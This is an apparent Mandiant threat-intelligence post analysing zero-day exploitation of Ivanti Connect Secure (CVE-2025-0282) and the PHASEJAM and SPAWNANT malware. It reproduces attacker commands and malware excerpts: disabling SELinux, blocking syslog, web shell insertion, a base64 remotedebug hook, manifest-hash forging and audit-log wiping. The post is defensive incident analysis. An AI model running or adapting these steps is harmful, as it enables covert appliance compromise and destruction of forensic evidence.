8-5.33V18H4z"></path></svg></a></li></ul></div></div></div></div></div><div><section class="nRhiJb-DARUcf"><div class="nRhiJb-DbgRPb-wNfPc-ma6Yeb nRhiJb-DbgRPb-wNfPc-cGMI2b"><section class="DA9Qj nRhiJb-ObfsIf nRhiJb-fmcmS-oXtfBe"><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-c5RTEf"></div><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-qWD73c"><h5 class="cHE8Ub Qwf2Db-MnozTc Qwf2Db-MnozTc-OWXEXe-MnozTc-qWD73c">Mandiant </h5><p class="nRhiJb-qJTHM khCp7b"></p></div></section></div></section><div class="nRhiJb-DARUcf"><div class="nRhiJb-ObfsIf nRhiJb-DbgRPb-wNfPc-ma6Yeb nRhiJb-DbgRPb-qWD73c-cGMI2b"><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-ibL1re dzoHJ"></div><div class="OYL9D nRhiJb-kR0ZEf-OWXEXe-GV1x9e-OiUrBf" jsname="tx2NYc"><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Written by: John Wolfram, Josh Murchie, Matt Lin, Daniel Ainsworth, Robert Wallace, Dimiter Andonov, Dhanesh Kizhakkinan, Jacob Thompson</p>
<hr></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="font-style:italic;vertical-align:baseline">Note: This is a developing campaign under active analysis by Mandiant and Ivanti. We will continue to add more indicators, detections, and information to this blog post as needed. See the Changelog at the bottom of this post for more details.</span></p>
<p><span style="vertical-align:baseline">On Wednesday, Jan. 8, 2025, Ivanti disclosed two vulnerabilities, </span><a href="https://www.virustotal.com/gui/collection/vulnerability--cve-2025-0282" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">CVE-2025-0282</span></a><span style="vertical-align:baseline"> and </span><a href="https://www.virustotal.com/gui/collection/vulnerability--cve-2025-0283" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">CVE-2025-0283</span></a><span style="vertical-align:baseline">, impacting Ivanti Connect Secure (“ICS”) VPN appliances. Mandiant has identified zero-day exploitation of CVE-2025-0282 in the wild beginning mid-December 2024. CVE-2025-0282 is an unauthenticated stack-based buffer overflow. Successful exploitation could result in unauthenticated remote code execution, leading to potential downstream compromise of a victim network.</span></p>
<p><span style="vertical-align:baseline">Ivanti and its affected customers identified the compromise based on indications from the company-supplied Integrity Checker Tool (“ICT”) along with other commercial security monitoring tools. Ivanti has been working closely with Mandiant, affected customers, government partners, and security vendors to address these issues. As a result of their investigation, Ivanti has released patches for the vulnerabilities exploited in this campaign and Ivanti customers are urged to follow the actions in the </span><a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-Policy-Secure-ZTA-Gateways-CVE-2025-0282-CVE-2025-0283" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">Security Advisory</span></a><span style="vertical-align:baseline"> to secure their systems as soon as possible.</span></p>
<p><span style="vertical-align:baseline">Mandiant is currently performing analysis of multiple compromised Ivanti Connect Secure appliances from multiple organizations. The activity described in this blog utilizes insights collectively derived from analysis of these infected devices and have not yet conclusively tied all of the activity described below to a single actor. In at least one of the appliances undergoing analysis, Mandiant observed the deployment of the previously observed </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/ivanti-post-exploitation-lateral-movement"><span style="text-decoration:underline;vertical-align:baseline">SPAWN ecosystem of malware</span></a><span style="vertical-align:baseline"> (which includes the <a href="https://www.virustotal.com/gui/collection/malware--c8d0d8da-9573-563f-bd12-a605a6365956" rel="noopener" target="_blank">SPAWNANT</a> installer, <a href="https://www.virustotal.com/gui/collection/malware--203afe3c-6cd5-503f-8e1a-918742ae9a29" rel="noopener" target="_blank">SPAWNMOLE</a> tunneler and the <a href="https://www.virustotal.com/gui/collection/malware--d4926375-27b0-5012-8feb-27d341f2dbfc" rel="noopener" target="_blank">SPAWNSNAIL</a> SSH backdoor). The deployment of the S</span><span style="vertical-align:baseline">PAWN ecosystem of malware following the targeting of Ivanti Secure Connect appliances has been attributed to </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/ivanti-post-exploitation-lateral-movement"><span style="text-decoration:underline;vertical-align:baseline">UNC5337</span></a><span style="vertical-align:baseline">, a cluster of activity assessed with moderate confidence to be part of </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/suspected-apt-targets-ivanti-zero-day/"><span style="text-decoration:underline;vertical-align:baseline">UNC5221</span></a><span style="vertical-align:baseline">, which is further described in the Attribution </span><span style="vertical-align:baseline">section. </span></p>
<p><span style="vertical-align:baseline">Mandiant has also identified previously unobserved malware families from additional compromised appliances, tracked as </span><a href="https://www.virustotal.com/gui/collection/malware--93fbcf96-3808-5b82-af22-ee77fa926a15" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">DRYHOOK</span></a><span style="vertical-align:baseline"> and </span><a href="https://www.virustotal.com/gui/collection/malware--df3c07a6-648c-5a5c-9c44-c98500606a1f" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">PHASEJAM</span></a><span style="vertical-align:baseline"> that are currently not yet linked to a known group. </span></p>
<p><span style="vertical-align:baseline">It is possible that multiple actors are responsible for the creation and deployment of these various code families (i.e. SPAWN, DRYHOOK and PHASEJAM), but as of publishing this report, we don't have enough data to accurately assess the number of threat actors targeting CVE-2025-0282. As additional insights are gathered, Mandiant will continue to update this blog post.</span></p>
<h2><span style="vertical-align:baseline">Exploitation</span></h2>
<p><span style="vertical-align:baseline">While CVE-2025-0282 affects multiple patch levels of ICS release 22.7R2, successful exploitation is version specific. Prior to exploitation, repeated requests to the appliance have been observed, likely to determine the version prior to attempting exploitation.</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">

</div></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">Version detection has been observed using the Host Checker Launcher, shown above, and the different client installers to determine the version of the appliance. HTTP requests from VPS providers or Tor networks to these URLs, especially in sequential version order, may indicate pre-exploitation reconnaissance.</span></p>
<p><span style="vertical-align:baseline">While there are several variations during the exploitation of CVE-2025-0282, the exploit and script generally performs the following steps:</span></p>
<ol>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Disable SELinux</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Prevent syslog forwarding</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Remount the drive as read-write</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Write the script</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Execute the script</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Deploy one or more web shells</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Use </span><code style="vertical-align:baseline">sed</code><span style="vertical-align:baseline"> to remove specific log entries from the debug and application logs</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Reenable SELinux</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Remount the drive</span></p>
</li>
</ol>
<p><span style="vertical-align:baseline">Immediately after exploitation the threat actor disables SELinux, uses </span><code style="vertical-align:baseline">iptables</code><span style="vertical-align:baseline"> to block syslog forwarding, and remounts the root partition to enable writing of malware to the appliance.</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>setenforce 0
iptables -A OUTPUT -p udp --dport 514 -j DROP
iptables -A OUTPUT -p tcp --dport 514 -j DROP
iptables -A OUTPUT -p udp --dport 6514 -j DROP
iptables -A OUTPUT -p tcp --dport 6514 -j DROP
mount -o remount,rw /</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><h3><span style="vertical-align:baseline">Malware Staging</span></h3>
<p><span style="vertical-align:baseline">Mandiant observed the threat actor using the shell script to echo a Base64-encoded script into the </span><code style="vertical-align:baseline">/tmp/.t</code><span style="vertical-align:baseline">, and then set execution permissions on the file. The figure below shows the contents of </span><code style="vertical-align:baseline">/tmp/.t</code><span style="vertical-align:baseline">.</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>#!/bin/sh
export LD_LIBRARY_PATH=/home/lib/;export DSINSTALL=/home;
export PATH=/usr/local/bin:/bin:/usr/bin:/sbin:/home/bin:/home/venv3/bin/;
dmesg -C;bash /tmp/s&gt;/tmp/kN;</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">Next, the threat actor writes a Base-64 encoded ELF binary into </span><code style="vertical-align:baseline">/tmp/svb</code><span style="vertical-align:baseline">. The ELF binary first uses </span><code style="vertical-align:baseline">setuid</code><span style="vertical-align:baseline"> to set the owner of the process to root. It then executes </span><code style="vertical-align:baseline">/tmp/s</code><span style="vertical-align:baseline"> (PHASEJAM) which would inherit the root privileges of the parent process. The threat actor then uses </span><code style="vertical-align:baseline">dd</code><span style="vertical-align:baseline"> to overwrite the </span><code style="vertical-align:baseline">svb</code><span style="vertical-align:baseline"> file with zeros, and removes </span><code style="vertical-align:baseline">/tmp/.t</code><span style="vertical-align:baseline">.</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>/bin/chmod 6777 /tmp/svb;
/tmp/svb;
/bin/dd count=1 bs=4096 if=/dev/zero of=/tmp/svb;
/bin/chmod 666 /tmp/svb;
/bin/rm -rf /tmp/.t;</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><h3><span style="vertical-align:baseline">PHASEJAM</span></h3>
<p><a href="https://www.virustotal.com/gui/collection/malware--df3c07a6-648c-5a5c-9c44-c98500606a1f" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">PHASEJAM</span></a><span style="vertical-align:baseline"> is a dropper written as a bash shell script that maliciously modifies Ivanti Connect Secure appliance components. The primary functions of PHASEJAM are to insert a web shell into the</span><code style="vertical-align:baseline"> getComponent.cgi</code><span style="vertical-align:baseline"> and</span><code style="vertical-align:baseline"> restAuth.cgi</code><span style="vertical-align:baseline"> files, block system upgrades by modifying the </span><code style="vertical-align:baseline">DSUpgrade.pm</code><span style="vertical-align:baseline"> file, and overwrite the </span><code style="vertical-align:baseline">remotedebug</code><span style="vertical-align:baseline"> executable so that it can be used to execute arbitrary commands when a specific parameter is passed. </span></p>
<h4><span style="vertical-align:baseline">Web Shell</span></h4>
<p><span style="vertical-align:baseline">PHASEJAM inserts the web shell into the legitimate files </span><code style="vertical-align:baseline">getComponent.cgi</code><span style="vertical-align:baseline"> and </span><code style="vertical-align:baseline">restAuth.cgi</code><span style="vertical-align:baseline"> as a function named </span><code style="vertical-align:baseline">AccessAllow()</code><span style="vertical-align:baseline">. The web shell is Perl-based and provides the threat actor with remote access and code execution capabilities on the compromised ICS server. It utilizes the </span><code style="vertical-align:baseline">MIME::Base64 </code><span style="vertical-align:baseline">module to encode and decode commands and data. </span></p>
<p><span style="vertical-align:baseline">The table below summarizes the web shell’s functionality, accessible via specific commands derived from HTTP query parameters:</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><div align="center">

</div></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><h4><span style="vertical-align:baseline">Blocked and Simulated Upgrades</span></h4>
<p><span style="vertical-align:baseline">To intercept upgrade attempts and simulate an upgrade, PHASEJAM injects a malicious function into the </span><code style="vertical-align:baseline">/home/perl/DSUpgrade.pm</code><span style="vertical-align:baseline"> file named </span><code style="vertical-align:baseline">processUpgradeDisplay()</code><span style="vertical-align:baseline">. The functionality is intended to simulate an upgrading process that involves thirteen steps, with each of those taking a predefined amount of time. If the ICS administrator attempts an upgrade, the function displays a visually-convincing upgrade process that shows each of the steps along with various numbers of dots to mimic a running process. Further details are provided in the System Upgrade Persistence </span><span style="vertical-align:baseline">section. </span></p>
<h4><span style="vertical-align:baseline">remotedebug Hooking</span></h4>
<p><span style="vertical-align:baseline">PHASEJAM renames the file </span><code style="vertical-align:baseline">/home/bin/remotedebug</code><span style="vertical-align:baseline"> to </span><code style="vertical-align:baseline">remotedebug.bak</code><span style="vertical-align:baseline">. PHASEJAM writes a new </span><code style="vertical-align:baseline">/home/bin/remotedebug</code><span style="vertical-align:baseline"> shell script to hook calls to </span><code style="vertical-align:baseline">remotedebug</code><span style="vertical-align:baseline">. The brief shell script checks for a new </span><code style="vertical-align:baseline">-c</code><span style="vertical-align:baseline"> parameter that allows remote code execution by the web shell. All other parameters are passed through to </span><code style="vertical-align:baseline">remotedebug.bak</code><span style="vertical-align:baseline">.</span></p>
<p><span style="vertical-align:baseline">The following provides an abridged PHASEJAM Sample:</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code># create backdoor 1
cp /home/webserver/htdocs/dana-na/jam/getComponent.cgi 
/home/webserver/htdocs/dana-na/jam/getComponent.cgi.bak

\$r7;/g&#39; /home/webserver/htdocs/dana-na/jam/getComponent.cgi

/home/webserver/htdocs/dana-na/jam/getComponent.cgi

/home/etc/manifest/manifest -a |grep

/home/webserver/htdocs/dana-na/jam/getComponent.cgi |grep 
-oE &#39;[0-9a-f]{64}&#39;)/g&quot; /home/etc/manifest/manifest;


#pkill cgi-server	


# create backdoor 2

/home/webserver/htdocs/dana-na/auth/restAuth.cgi.bak

\$r7;/g&#39; /home/webserver/htdocs/dana-na/auth/restAuth.cgi

/home/webserver/htdocs/dana-na/auth/restAuth.cgi

-oE &#39;[0-9a-f]{64}&#39;)/g&quot; /home/etc/manifest/manifest;

#pkill cgi-server


# remotedebug
cp -f /home/bin/remotedebug /home/bin/remotedebug.bak
echo IyEvYmluL2Jhc2gKaWYgWyAiJDEiID09ICItYyIgXTsgdGhlbgoJYm
FzaCAiJEAiCmVsc2UKCWV4ZWMgL2hvbWUvYmluL3JlbW90ZWRlYnV
nLmJhayAiJEAiCmZpICAK|base64 -d &gt;/home/bin/remotedebug
chmod 777 /home/bin/remotedebug.bak
sed -i &quot;s/$(grep /home/bin/remotedebug /home/etc/manifest/manifest 
-a |grep -oE &#39;[0-9a-f]{64}&#39;)/$(/home/bin/openssl dgst -sha256 
/home/bin/remotedebug |grep -oE &#39;[0-9a-f]{64}&#39;)/g&quot; 
/home/etc/manifest/manifest;

# upgrade
cp -f /home/perl/DSUpgrade.pm /home/perl/DSUpgrade.pm.bak
sed -i &#39;s/popen(\*FH, \$prog);/processUpgradeDisplay(\$prog, 
\$console, \$html);return 0;popen(\*FH, \$prog);/g&#39; 
/home/perl/DSUpgrade.pm
grep -q &#39;sub processUpgradeDisplay()&#39; || echo &quot;$up&quot; &gt;&gt; 
/home/perl/DSUpgrade.pm
sed -i &quot;s/$(grep /home/perl/DSUpgrade.pm /home/etc/manifest/manifest 
-a |grep -oE &#39;[0-9a-f]{64}&#39;)/$(/home/bin/openssl dgst -sha256 
/home/perl/DSUpgrade.pm |grep -oE &#39;[0-9a-f]{64}&#39;)/g&quot; 
/home/etc/manifest/manifest;
pkill cgi-server</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><h3><span style="vertical-align:baseline">Anti-Forensics</span></h3>
<p><span style="vertical-align:baseline">Following exploitation, the threat actor has been observed removing evidence of exploitation from several key areas of the appliance:</span></p>
<ol>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Clearing kernel messages using </span><code style="vertical-align:baseline">dmesg</code><span style="vertical-align:baseline"> and removing entries from the debug logs that are generated during the exploit</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Deleting troubleshoot information packages (state dumps) and any core dumps generated from process crashes</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Removing log application event log entries related to syslog failures, internal ICT failures, crash traces, and certificate handling errors</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Removing executed commands from the SELinux audit log</span></p>
</li>
</ol></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>dmesg -C

\x01/g' log.events.vc0

sed -i '/bin\/web/d' audit.log
sed -i '/setenforce/d' audit.log
sed -i '/mount/d' audit.log
sed -i '/bin\/rm/d' audit.log</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><h2><span style="vertical-align:baseline">System Upgrade Persistence</span></h2>
<p><span style="vertical-align:baseline">Mandiant identified two techniques the threat actor employed to persist across system upgrades on compromised Ivanti Connect Secure appliances.</span></p>
<h4><span style="vertical-align:baseline">Fake System Upgrades</span></h4>
<p><span style="vertical-align:baseline">The first technique, utilized by PHASEJAM, prevents legitimate ICS system upgrade attempts by administrators via rendering a fake HTML upgrade progress bar while silently blocking the legitimate upgrade process. Due to the blocked upgrade attempt, the technique would allow any installed backdoors or tools left by the threat actor to persist on the current running version of the VPN while giving the appearance of a successful upgrade.  </span></p>
<p><span style="vertical-align:baseline">First, the threat actor uses </span><code style="vertical-align:baseline">sed</code><span style="vertical-align:baseline"> to insert a malicious Perl code into </span><code style="vertical-align:baseline">DSUpgrade.pm</code><span style="vertical-align:baseline"> to modify the behavior of the system upgrade process. The malicious </span><code style="vertical-align:baseline">processUpgradeDisplay()</code><span style="vertical-align:baseline"> function, which is stored in the shell variable </span><code style="vertical-align:baseline">$up</code><span style="vertical-align:baseline">, is appended to </span><code style="vertical-align:baseline">DSUpgrade.pm</code><span style="vertical-align:baseline">. </span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>sed -i &#39;s/popen(\*FH, \$prog);/processUpgradeDisplay(\$prog, 
\$console, \$html);return 0;popen(\*FH, \$prog);/g&#39; 
/home/perl/DSUpgrade.pm
grep -q &#39;sub processUpgradeDisplay()&#39; || echo &quot;$up&quot; &gt;&gt; 
/home/perl/DSUpgrade.pm</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">The modification occurs within a function in </span><code style="vertical-align:baseline">DSUpgrade.pm </code><span style="vertical-align:baseline">responsible for installing the new upgrade package. The inserted call to </span><code style="vertical-align:baseline">processUpgradeDisplay()</code><span style="vertical-align:baseline"> with the early return makes the legitimate </span><code style="vertical-align:baseline">popen()</code><span style="vertical-align:baseline"> call to execute </span><code style="vertical-align:baseline">/pkg/dspkginstall</code><span style="vertical-align:baseline"> unreachable. The following provides the relevant excerpt from </span><code style="vertical-align:baseline">DSUpgrade.pm</code><span style="vertical-align:baseline"> as a result of the modification.</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>local *FH;
my $prog = &quot;/pkg/dspkginstall /var/tmp/new-pack.tgz&quot;;
if (defined $useUpgradePartition &amp;&amp; $useUpgradePartition == 1) {
  $prog = &quot;/pkg/dspkginstall /data/upgrade/new-pack.tgz&quot;;
}

processUpgradeDisplay($prog, $console, $html);
return 0;
popen(*FH, $prog);</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">The modification intercepts the standard upgrade flow by calling the maliciously created </span><code style="vertical-align:baseline">processUpgradeDisplay()</code><span style="vertical-align:baseline"> function before the legitimate upgrade command executes. The figure below provides an excerpt of the inserted </span><code style="vertical-align:baseline">processUpgradeDisplay()</code><span style="vertical-align:baseline"> function that displays a fake HTML upgrade progress bar, using the </span><code style="vertical-align:baseline">sleep</code><span style="vertical-align:baseline"> command to add dots every second to mimic a running process.</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>$mystep = 13;
$count = 0;
$sleep_time = 2;
$myline = &quot;Finalizing installation&quot;;
print $html &quot;&lt;li style=\&quot;margin:6px;\&quot;&gt;Step $mystep: $myline ...&quot;;
print $console &quot;$myline ...&quot;;
while ($count &lt; $sleep_time) {
      system(&quot;/bin/sleep 1&quot;);
      print $html &quot;.&quot;;
      print $console &quot;.&quot;;
      ++$count;
}
print $html &quot; complete ($sleep_time seconds)&lt;/li&gt;\n&quot;;
print $console &quot; complete ($sleep_time seconds)\r\n&quot;;</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">Recent versions of Ivanti Connect Secure have a built-in integrity checker tool (ICT) that periodically scans the file system to detect new or modified system files that may be indicative of system compromise. The ICT uses a manifest during its scanning process, containing a list of the expected file paths on the system along with its expected SHA256 hash. In an attempt to circumvent the ICT scanner, the threat actor recalculates the SHA256 hash of the modified </span><code style="vertical-align:baseline">DSUpgrade.pm</code><span style="vertical-align:baseline"> and inserts it into the manifest.</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>sed -i "s/$(grep /home/perl/DSUpgrade.pm 
/home/etc/manifest/manifest -a |grep -oE 
'[0-9a-f]{64}')/$(/home/bin/openssl dgst -sha256 
/home/perl/DSUpgrade.pm |grep -oE '[0-9a-f]{64}')/g" 
/home/etc/manifest/manifest;</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">The threat actor copies the </span><code style="vertical-align:baseline">VERSION</code><span style="vertical-align:baseline"> file from the mounted upgrade partition (</span><code style="vertical-align:baseline">tmp/root/home/VERSION</code><span style="vertical-align:baseline">) to the current version partition (</span><code style="vertical-align:baseline">/home/VERSION</code><span style="vertical-align:baseline">). As a result, the system falsely indicates a successful upgrade while continuing to run on the old appliance version.</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>chdir("/tmp");
system("/bin/mkdir", "-p", "root/home");
system("/bin/tar", "-xzf", $tgz_path, "./root/home/VERSION");
system("/bin/cp -f ./root/home/VERSION /data/versions/reset/VERSION");
system("/bin/cp -f ./root/home/VERSION /home/VERSION");</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">The SHA256 hash of the </span><code style="vertical-align:baseline">VERSION</code><span style="vertical-align:baseline"> file from the upgrade partition is recalculated and inserted into the ICT manifest.</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>system('sed -i \'s/$(grep /home/VERSION|grep 
-oE "[0-9a-f]{64}")/$(/home/bin/openssl dgst -sha256 
/home/VERSION)/g\' /home/etc/manifest/manifest');</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><h4><span style="vertical-align:baseline">Persistence Across Upgrades</span></h4>
<p><span style="vertical-align:baseline">SPAWNANT (</span><code style="vertical-align:baseline">libupgrade.so</code><span style="vertical-align:baseline">) is an ELF32 executable that installs three components from the </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/ivanti-post-exploitation-lateral-movement"><span style="text-decoration:underline;vertical-align:baseline">SPAWN family</span></a><span style="vertical-align:baseline">:</span></p>
<ol>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">SPAWNMOLE tunneler (</span><code style="vertical-align:baseline">libsocks5.so</code><span style="vertical-align:baseline">)</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">SPAWNSNAIL SSH backdoor (</span><code style="vertical-align:baseline">libsshd.so</code><span style="vertical-align:baseline">)</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">SPAWNSLOTH log tampering utility (</span><code style="vertical-align:baseline">.liblogblock.so</code><span style="vertical-align:baseline">)</span></p>
</li>
</ol>
<p><span style="vertical-align:baseline">SPAWNANT and its supporting components can persist across system upgrades. It hijacks the execution flow of </span><code style="vertical-align:baseline">dspkginstall</code><span style="vertical-align:baseline">, a binary used during the system upgrade process, by exporting a malicious </span><code style="vertical-align:baseline">snprintf</code><span style="vertical-align:baseline"> function containing the persistence mechanism.</span></p>
